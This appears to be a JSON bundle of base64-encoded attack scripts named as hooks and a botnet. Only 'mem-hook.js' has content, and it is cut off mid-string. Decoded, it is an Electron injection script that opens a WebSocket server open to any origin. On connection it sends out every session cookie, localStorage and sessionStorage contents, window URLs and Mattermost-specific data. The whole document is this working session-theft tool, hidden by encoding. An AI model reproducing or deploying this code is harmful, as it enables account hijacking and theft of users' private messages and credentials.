{"botnet.js":"","cookie-hook.js":"","enable_dev_mode.js":"","ipc-hook.js":"","ipc-mon.js":"","mem-hook.js":"Y29uc29sZS5sb2coJ1tIRUFQLUVYVFJBQ1RdIFN0YXJ0aW5nIGRlZXAgaGVhcCBleHRyYWN0aW9uLi4uJyk7CgooZnVuY3Rpb24oKSB7CiAgICAndXNlIHN0cmljdCc7CiAgICAKICAgIC8vIFNraXAgaWYgYWxyZWFkeSBsb2FkZWQKICAgIGlmIChnbG9iYWwuX2hlYXBFeHRyYWN0b3JMb2FkZWQpIHsKICAgICAgICBjb25zb2xlLmxvZygnW0hFQVAtRVhUUkFDVF0gQWxyZWFkeSBsb2FkZWQsIHNraXBwaW5nLi4uJyk7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgZ2xvYmFsLl9oZWFwRXh0cmFjdG9yTG9hZGVkID0gdHJ1ZTsKICAgIAogICAgY29uc3QgUE9SVCA9IDEwMDEzOwogICAgY29uc3QgeyBhcHAgfSA9IHJlcXVpcmUoJ2VsZWN0cm9uJyk7CiAgICBjb25zdCBodHRwID0gcmVxdWlyZSgnaHR0cCcpOwogICAgY29uc3QgY3J5cHRvID0gcmVxdWlyZSgnY3J5cHRvJyk7CiAgICAKICAgIC8vIENyZWF0ZSBXZWJTb2NrZXQgc2VydmVyCiAgICBmdW5jdGlvbiBjcmVhdGVTZXJ2ZXIoKSB7CiAgICAgICAgY29uc3QgY2xpZW50cyA9IG5ldyBTZXQoKTsKICAgICAgICBjb25zdCBzZXJ2ZXIgPSBodHRwLmNyZWF0ZVNlcnZlcigocmVxLCByZXMpID0+IHsKICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJywgJyonKTsKICAgICAgICAgICAgcmVzLnNldEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKTsKICAgICAgICAgICAgcmVzLndyaXRlSGVhZCgyMDApOwogICAgICAgICAgICByZXMuZW5kKEpTT04uc3RyaW5naWZ5KHtzdGF0dXM6ICdEZWVwIGhlYXAgZXh0cmFjdGlvbiBzZXJ2ZXIgcnVubmluZyd9KSk7CiAgICAgICAgfSk7CiAgICAgICAgCiAgICAgICAgLy8gV2ViU29ja2V0IHVwZ3JhZGUgaGFuZGxlciAtIHNhbWUgYXMgeW91ciB3b3JraW5nIGNvZGUKICAgICAgICBzZXJ2ZXIub24oJ3VwZ3JhZGUnLCAocmVxdWVzdCwgc29ja2V0LCBoZWFkKSA9PiB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgdXBncmFkZSByZXF1ZXN0ZWQnKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IGtleSA9IHJlcXVlc3QuaGVhZGVyc1snc2VjLXdlYnNvY2tldC1rZXknXTsKICAgICAgICAgICAgaWYgKCFrZXkpIHsKICAgICAgICAgICAgICAgIHNvY2tldC5lbmQoJ0hUVFAvMS4xIDQwMCBCYWQgUmVxdWVzdFxyXG5cclxuJyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEdlbmVyYXRlIFdlYlNvY2tldCBhY2NlcHQga2V5CiAgICAgICAgICAgIGNvbnN0IGFjY2VwdEtleSA9IGNyeXB0bwogICAgICAgICAgICAgICAgLmNyZWF0ZUhhc2goJ3NoYTEnKQogICAgICAgICAgICAgICAgLnVwZGF0ZShrZXkgKyAnMjU4RUFGQTUtRTkxNC00N0RBLTk1Q0EtQzVBQjBEQzg1QjExJykKICAgICAgICAgICAgICAgIC5kaWdlc3QoJ2Jhc2U2NCcpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8gU2VuZCBXZWJTb2NrZXQgaGFuZHNoYWtlIHJlc3BvbnNlCiAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlSGVhZGVycyA9IFsKICAgICAgICAgICAgICAgICdIVFRQLzEuMSAxMDEgU3dpdGNoaW5nIFByb3RvY29scycsCiAgICAgICAgICAgICAgICAnVXBncmFkZTogd2Vic29ja2V0JywKICAgICAgICAgICAgICAgICdDb25uZWN0aW9uOiBVcGdyYWRlJywKICAgICAgICAgICAgICAgIGBTZWMtV2ViU29ja2V0LUFjY2VwdDogJHthY2NlcHRLZXl9YCwKICAgICAgICAgICAgICAgICcnLCAnJwogICAgICAgICAgICBdLmpvaW4oJ1xyXG4nKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBzb2NrZXQud3JpdGUocmVzcG9uc2VIZWFkZXJzKTsKICAgICAgICAgICAgICAgIGNsaWVudHMuYWRkKHNvY2tldCk7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygnW0hFQVAtRVhUUkFDVF0gV2ViU29ja2V0IGNsaWVudCBjb25uZWN0ZWQnKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gU3RhcnQgZXh0cmFjdGlvbiBwcm9jZXNzCiAgICAgICAgICAgICAgICBleHRyYWN0QWxsRGF0YShzb2NrZXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBzb2NrZXQub24oJ2Nsb3NlJywgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgY2xpZW50IGRpc2Nvbm5lY3RlZCcpOwogICAgICAgICAgICAgICAgICAgIGNsaWVudHMuZGVsZXRlKHNvY2tldCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc29ja2V0Lm9uKCdlcnJvcicsIChlcnIpID0+IHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgICAgICAgICBjbGllbnRzLmRlbGV0ZShzb2NrZXQpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBXZWJTb2NrZXQgaGFuZHNoYWtlIGVycm9yOicsIGVycm9yKTsKICAgICAgICAgICAgICAgIHNvY2tldC5lbmQoKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIC8vIFdlYlNvY2tldCBtZXNzYWdlIHNlbmRlcgogICAgICAgIGZ1bmN0aW9uIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgbWVzc2FnZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgYnVmZmVyID0gQnVmZmVyLmZyb20obWVzc2FnZSwgJ3V0ZjgnKTsKICAgICAgICAgICAgICAgIGNvbnN0IGZyYW1lTGVuZ3RoID0gYnVmZmVyLmxlbmd0aDsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGV0IGZyYW1lOwogICAgICAgICAgICAgICAgaWYgKGZyYW1lTGVuZ3RoIDwgMTI2KSB7CiAgICAgICAgICAgICAgICAgICAgZnJhbWUgPSBCdWZmZXIuYWxsb2MoZnJhbWVMZW5ndGggKyAyKTsKICAgICAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgICAgICBmcmFtZVsxXSA9IGZyYW1lTGVuZ3RoOwogICAgICAgICAgICAgICAgICAgIGJ1ZmZlci5jb3B5KGZyYW1lLCAyKTsKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZnJhbWVMZW5ndGggPCA2NTUzNikgewogICAgICAgICAgICAgICAgICAgIGZyYW1lID0gQnVmZmVyLmFsbG9jKGZyYW1lTGVuZ3RoICsgNCk7CiAgICAgICAgICAgICAgICAgICAgZnJhbWVbMF0gPSAweDgxOyAvLyBUZXh0IGZyYW1lCiAgICAgICAgICAgICAgICAgICAgZnJhbWVbMV0gPSAxMjY7CiAgICAgICAgICAgICAgICAgICAgZnJhbWUud3JpdGVVSW50MTZCRShmcmFtZUxlbmd0aCwgMik7CiAgICAgICAgICAgICAgICAgICAgYnVmZmVyLmNvcHkoZnJhbWUsIDQpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBmcmFtZSA9IEJ1ZmZlci5hbGxvYyhmcmFtZUxlbmd0aCArIDEwKTsKICAgICAgICAgICAgICAgICAgICBmcmFtZVswXSA9IDB4ODE7IC8vIFRleHQgZnJhbWUKICAgICAgICAgICAgICAgICAgICBmcmFtZVsxXSA9IDEyNzsKICAgICAgICAgICAgICAgICAgICBmcmFtZS53cml0ZVVJbnQzMkJFKDAsIDIpOwogICAgICAgICAgICAgICAgICAgIGZyYW1lLndyaXRlVUludDMyQkUoZnJhbWVMZW5ndGgsIDYpOwogICAgICAgICAgICAgICAgICAgIGJ1ZmZlci5jb3B5KGZyYW1lLCAxMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2tldC53cml0ZShmcmFtZSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gRXJyb3Igc2VuZGluZyBXZWJTb2NrZXQgbWVzc2FnZTonLCBlcnIpOwogICAgICAgICAgICAgICAgaWYgKCFzb2NrZXQuZGVzdHJveWVkKSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0LmVuZCgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIE1haW4gZXh0cmFjdGlvbiBmdW5jdGlvbgogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4dHJhY3RBbGxEYXRhKHNvY2tldCkgewogICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgIHR5cGU6ICdleHRyYWN0aW9uX3N0YXJ0JywKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAvLyAxLiBFeHRyYWN0IGFwcCBpbmZvCiAgICAgICAgICAgICAgICBhd2FpdCBleHRyYWN0QXBwSW5mbyhzb2NrZXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyAyLiBFeHRyYWN0IEJyb3dzZXJXaW5kb3cgZGF0YQogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdFdpbmRvd3NEYXRhKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIDMuIEV4dHJhY3QgY29va2llcyBhbmQgc3RvcmFnZQogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdENvb2tpZXNBbmRTdG9yYWdlKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIDQuIEV4dHJhY3QgbG9jYWwgc3RvcmFnZSBkYXRhCiAgICAgICAgICAgICAgICBhd2FpdCBleHRyYWN0TG9jYWxTdG9yYWdlRGF0YShzb2NrZXQpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyA1LiBFeHRyYWN0IE1hdHRlcm1vc3Qtc3BlY2lmaWMgZGF0YQogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdE1hdHRlcm1vc3REYXRhKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIDYuIEV4dHJhY3QgbmV0d29yayBjb25uZWN0aW9ucwogICAgICAgICAgICAgICAgYXdhaXQgZXh0cmFjdE5ldHdvcmtEYXRhKHNvY2tldCk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIENvbXBsZXRlCiAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnZXh0cmFjdGlvbl9jb21wbGV0ZScsCiAgICAgICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvSVNPU3RyaW5nKCkKICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBFeHRyYWN0aW9uIGVycm9yOicsIGVycik7CiAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAnZXJyb3InLAogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6IGVyci5tZXNzYWdlLAogICAgICAgICAgICAgICAgICAgIHN0YWNrOiBlcnIuc3RhY2sKICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IGFwcGxpY2F0aW9uIGluZm8KICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0QXBwSW5mbyhzb2NrZXQpIHsKICAgICAgICAgICAgY29uc3QgYXBwSW5mbyA9IHsKICAgICAgICAgICAgICAgIHR5cGU6ICdhcHBfaW5mbycsCiAgICAgICAgICAgICAgICBuYW1lOiBhcHAuZ2V0TmFtZSgpLAogICAgICAgICAgICAgICAgdmVyc2lvbjogYXBwLmdldFZlcnNpb24oKSwKICAgICAgICAgICAgICAgIGxvY2FsZTogYXBwLmdldExvY2FsZSgpLAogICAgICAgICAgICAgICAgaXNQYWNrYWdlZDogYXBwLmlzUGFja2FnZWQsCiAgICAgICAgICAgICAgICBhcHBQYXRoOiBhcHAuZ2V0QXBwUGF0aCgpLAogICAgICAgICAgICAgICAgcGF0aHM6IHt9LAogICAgICAgICAgICAgICAgZWxlY3Ryb25WZXJzaW9uOiBwcm9jZXNzLnZlcnNpb25zLmVsZWN0cm9uLAogICAgICAgICAgICAgICAgY2hyb21lVmVyc2lvbjogcHJvY2Vzcy52ZXJzaW9ucy5jaHJvbWUKICAgICAgICAgICAgfTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vIEdldCBhbGwgYXBwIHBhdGhzCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCBwYXRoTmFtZXMgPSBbJ2hvbWUnLCAnYXBwRGF0YScsICd1c2VyRGF0YScsICdzZXNzaW9uRGF0YScsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3RlbXAnLCAnZXhlJywgJ21vZHVsZScsICdkZXNrdG9wJywgJ2RvY3VtZW50cycsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2Rvd25sb2FkcycsICdsb2dzJywgJ2NyYXNoRHVtcHMnXTsKICAgICAgICAgICAgICAgIGZvciAoY29uc3QgbmFtZSBvZiBwYXRoTmFtZXMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICBhcHBJbmZvLnBhdGhzW25hbWVdID0gYXBwLmdldFBhdGgobmFtZSk7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAvLyBTa2lwIHVuYXZhaWxhYmxlIHBhdGhzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGFwcEluZm8ucGF0aEVycm9yID0gZXJyLm1lc3NhZ2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkoYXBwSW5mbykpOwogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IEJyb3dzZXJXaW5kb3cgZGF0YQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4dHJhY3RXaW5kb3dzRGF0YShzb2NrZXQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgQnJvd3NlcldpbmRvdyB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IHdpbmRvd3MgPSBCcm93c2VyV2luZG93LmdldEFsbFdpbmRvd3MoKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCB3aW5kb3dzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3Qgd2luID0gd2luZG93c1tpXTsKICAgICAgICAgICAgICAgICAgICBjb25zdCB3aW5EYXRhID0gewogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnd2luZG93X2RhdGEnLAogICAgICAgICAgICAgICAgICAgICAgICBpZDogd2luLmlkLAogICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogd2luLmdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogd2luLndlYkNvbnRlbnRzPy5nZXRVUkwoKSwKICAgICAgICAgICAgICAgICAgICAgICAgYm91bmRzOiB3aW4uZ2V0Qm91bmRzKCksCiAgICAgICAgICAgICAgICAgICAgICAgIHdlYkNvbnRlbnRzSWQ6IHdpbi53ZWJDb250ZW50cz8uaWQKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHNlbmRXZWJTb2NrZXRNZXNzYWdlKHNvY2tldCwgSlNPTi5zdHJpbmdpZnkod2luRGF0YSkpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIC8vIEV4dHJhY3Qgd2ViIGNvbnRlbnRzCiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbi53ZWJDb250ZW50cykgewogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBleHRyYWN0V2ViQ29udGVudHNEYXRhKHNvY2tldCwgd2luLndlYkNvbnRlbnRzLCBpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gV2luZG93IGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IFdlYkNvbnRlbnRzIGRhdGEKICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0V2ViQ29udGVudHNEYXRhKHNvY2tldCwgd2ViQ29udGVudHMsIHdpbmRvd0luZGV4KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCB3Y0RhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgdHlwZTogJ3dlYl9jb250ZW50cycsCiAgICAgICAgICAgICAgICAgICAgaWQ6IHdlYkNvbnRlbnRzLmlkLAogICAgICAgICAgICAgICAgICAgIHdpbmRvd0luZGV4LAogICAgICAgICAgICAgICAgICAgIHVybDogd2ViQ29udGVudHMuZ2V0VVJMKCksCiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHdlYkNvbnRlbnRzLmdldFRpdGxlKCksCiAgICAgICAgICAgICAgICAgICAgdXNlckFnZW50OiB3ZWJDb250ZW50cy51c2VyQWdlbnQKICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC8vIEdldCBoaXN0b3J5IGlmIGF2YWlsYWJsZQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBpZiAod2ViQ29udGVudHMuaGlzdG9yeSkgewogICAgICAgICAgICAgICAgICAgICAgICB3Y0RhdGEuaGlzdG9yeSA9IHdlYkNvbnRlbnRzLmhpc3Rvcnk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge30KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh3Y0RhdGEpKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSBzY3JpcHQgaW4gcmVuZGVyZXIgdG8gZXh0cmFjdCBET00gc3RvcmFnZQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBzdG9yYWdlRGF0YSA9IGF3YWl0IHdlYkNvbnRlbnRzLmV4ZWN1dGVKYXZhU2NyaXB0KGAKICAgICAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZGF0YSA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2U6IHt9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb25TdG9yYWdlOiB7fQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCBsb2NhbFN0b3JhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbG9jYWxTdG9yYWdlLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qga2V5ID0gbG9jYWxTdG9yYWdlLmtleShpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmxvY2FsU3RvcmFnZVtrZXldID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oa2V5KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEubG9jYWxTdG9yYWdlW2tleV0gPSAnW0Vycm9yOiAnICsgZS5tZXNzYWdlICsgJ10nOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gRXh0cmFjdCBzZXNzaW9uU3RvcmFnZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzZXNzaW9uU3RvcmFnZS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IHNlc3Npb25TdG9yYWdlLmtleShpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnNlc3Npb25TdG9yYWdlW2tleV0gPSBzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKGtleSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnNlc3Npb25TdG9yYWdlW2tleV0gPSAnW0Vycm9yOiAnICsgZS5tZXNzYWdlICsgJ10nOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGE7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pKCk7CiAgICAgICAgICAgICAgICAgICAgYCk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdkb21fc3RvcmFnZScsCiAgICAgICAgICAgICAgICAgICAgICAgIHdlYkNvbnRlbnRzSWQ6IHdlYkNvbnRlbnRzLmlkLAogICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3dJbmRleCwKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogc3RvcmFnZURhdGEKICAgICAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignW0hFQVAtRVhUUkFDVF0gU3RvcmFnZSBleHRyYWN0aW9uIGVycm9yOicsIGUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIFdlYkNvbnRlbnRzIGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IGNvb2tpZXMgYW5kIHNlc3Npb24gc3RvcmFnZQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGV4dHJhY3RDb29raWVzQW5kU3RvcmFnZShzb2NrZXQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgc2Vzc2lvbiB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvbi5kZWZhdWx0U2Vzc2lvbjsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKGRlZmF1bHRTZXNzaW9uKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gR2V0IGFsbCBjb29raWVzCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgY29va2llcyA9IGF3YWl0IGRlZmF1bHRTZXNzaW9uLmNvb2tpZXMuZ2V0KHt9KTsKICAgICAgICAgICAgICAgICAgICAgICAgc2VuZFdlYlNvY2tldE1lc3NhZ2Uoc29ja2V0LCBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnY29va2llcycsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudDogY29va2llcy5sZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzCiAgICAgICAgICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1tIRUFQLUVYVFJBQ1RdIENvb2tpZSBleHRyYWN0aW9uIGVycm9yOicsIGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAvLyBHZXQgc3RvcmFnZSB1c2FnZQogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHN0b3JhZ2VVc2FnZSA9IGF3YWl0IGRlZmF1bHRTZXNzaW9uLmdldFN0b3JhZ2VVc2FnZSgpOwogICAgICAgICAgICAgICAgICAgICAgICBzZW5kV2ViU29ja2V0TWVzc2FnZShzb2NrZXQsIEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU6ICdzdG9yYWdlX3VzYWdlJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzYWdlOiBzdG9yYWdlVXNhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gU3RvcmFnZSB1c2FnZSBtYXkgbm90IGJlIGF2YWlsYWJsZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdbSEVBUC1FWFRSQUNUXSBTZXNzaW9uIGV4dHJhY3Rpb24gZXJyb3I6JywgZXJyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAvLyBFeHRyYWN0IGxvY2FsU3RvcmFnZSBkYXRhIChmb3IgbXVsdGlwbGUgcGFydGl0aW9ucykKICAgICAgICBhc3luYyBmdW5jdGlvbiBleHRyYWN0TG9jYWxTdG9yYWdlRGF0YShzb2NrZXQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHsgc2Vzc2lvbiB9ID0gcmVxdWlyZSgnZWxlY3Ryb24nKTsKICAgICAgICAgICAgICAgIGNvbnN0IGRlZmF1bHRTZXNzaW9uID0gc2Vzc2lvb